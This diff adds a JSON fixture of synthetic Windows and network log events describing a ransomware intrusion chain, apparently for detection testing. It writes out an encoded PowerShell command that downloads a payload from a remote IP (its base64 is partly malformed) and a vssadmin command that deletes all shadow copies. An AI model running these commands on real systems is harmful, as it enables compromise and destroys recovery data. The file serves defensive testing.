@@ -1,0 +1,62 @@
+[
+  {
+    "id": "EVT-RANSOM-01",
+    "timestamp": "2026-09-01T04:12:00Z",
+    "EventID": 4688,
+    "SubjectUserName": "finance_admin",
+    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0AC8AcABheWxvYWQuZQB4AGUA",
+    "Computer": "CORP-FIN-WS01",
+    "description": "Suspicious encoded PowerShell execution spawned by cmd.exe downloading remote payload from known malicious host 185.220.101.4.",
+    "severity": "CRITICAL"
+  },
+  {
+    "id": "EVT-RANSOM-02",
+    "timestamp": "2026-09-01T04:14:22Z",
+    "SourceName": "Microsoft-Windows-Sysmon",
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\Temp\\payload.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1FFFFF",
+    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9fb24|C:\\Windows\\System32\\KERNELBASE.dll+2c34e",
+    "description": "Mimikatz LSASS memory dump attempt. Full process access requested to extract domain credentials.",
+    "severity": "CRITICAL",
+    "Malware Indicators": "Mimikatz credential dumping signature"
+  },
+  {
+    "id": "EVT-RANSOM-03",
+    "timestamp": "2026-09-01T04:20:05Z",
+    "source_ip": "10.0.4.15",
+    "dest_ip": "10.0.2.5",
+    "source_port": 49210,
+    "dest_port": 445,
+    "protocol": "TCP",
+    "packet_length": 1420,
+    "description": "SMB PsExec lateral movement from CORP-FIN-WS01 to DC-PRIMARY-01. Admin share access detected.",
+    "severity": "HIGH",
+    "user": "finance_admin"
+  },
+  {
+    "id": "EVT-RANSOM-04",
+    "timestamp": "2026-09-01T04:25:30Z",
+    "EventID": 7045,
+    "ServiceName": "vssadmin_shadow_delete",
+    "ImagePath": "C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet",
+    "Computer": "DC-PRIMARY-01",
+    "description": "Volume Shadow Copies deleted via vssadmin. Classic pre-ransomware persistence and recovery prevention behavior.",
+    "severity": "CRITICAL"
+  },
+  {
+    "id": "EVT-RANSOM-05",
+    "timestamp": "2026-09-01T04:30:12Z",
+    "source_ip": "10.0.2.5",
+    "dest_ip": "91.108.4.22",
+    "source_port": 58901,
+    "dest_port": 4444,
+    "protocol": "TCP",
+    "packet_length": 894000,
+    "description": "High volume C2 beacon communication to Tor exit node on port 4444. Data exfiltration in progress.",
+    "severity": "CRITICAL",
+    "Malware Indicators": "Cobalt Strike C2 Beacon"
+  }
+]
